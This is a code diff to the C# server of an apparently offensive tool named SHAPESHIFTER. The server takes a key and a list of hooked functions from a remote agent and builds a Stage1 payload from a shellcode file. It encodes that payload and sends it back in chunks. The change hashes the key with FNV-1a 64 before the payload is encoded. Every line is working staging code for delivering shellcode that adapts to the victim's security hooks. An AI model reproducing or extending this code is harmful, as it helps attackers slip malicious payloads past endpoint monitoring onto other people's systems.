@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 
@@ -49,6 +50,20 @@ namespace SHAPESHIFTER
                     while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                     {
                         string testkey = Helpers.KeyParser(bytes);
+                        var hashes = new System.Security.Cryptography.HashAlgorithm[] { new FNV1aHash64() };
+                        string stringValue = "";
+                        for(int h = 0; h < hashes.Length; h++)
+                        {
+                            using (var s = new System.IO.MemoryStream(testkey.ToCharArray().Select(c => (byte)c).ToArray()))
+                            {
+                                var value = hashes[h].ComputeHash(s);
+                                var convertedvalue = hashes[h].HashSize == 32 ? BitConverter.ToUInt32(value, 0) : BitConverter.ToUInt64(value, 0);
+                                stringValue = convertedvalue.ToString();
+                                //Console.WriteLine("Raw Bytes: {0}", BitConverter.ToString(value));
+                                //Console.WriteLine("Converted Value: {0}", convertedvalue);
+                            }
+                        }
+                        
                         //Console.WriteLine(testkey);
                         IList<string> hooks = Helpers.ResultsParser(bytes);
                         if (hooks.Count != 0)
@@ -59,7 +74,7 @@ namespace SHAPESHIFTER
                             }
                         }
 
-                        if (!Compiler.BuildStage1(hooks, shellcodeFile, clientId.ToString(),testkey))
+                        if (!Compiler.BuildStage1(hooks, shellcodeFile, clientId.ToString(),stringValue))
                         {
                             Console.WriteLine("  [-] Failed to generate Stage1 source file");
                             break;
@@ -79,7 +94,7 @@ namespace SHAPESHIFTER
                         //Console.WriteLine("  [>] Sent {0} bytes back to the agent", stage1.Length);
                         int stageSize = stage1.Length;
                         int chunkCount = (stageSize + 999) / 1000;
-                        Console.WriteLine("  [>] Encoding payload with key: {0}", testkey);
+                        Console.WriteLine("  [>] Encoding payload with key: {0}", stringValue);
                         Console.WriteLine("  [>] Sending total of {0} bytes to the agent...", stageSize);
                         for (int j = 0; j < chunkCount; j++)
                         {
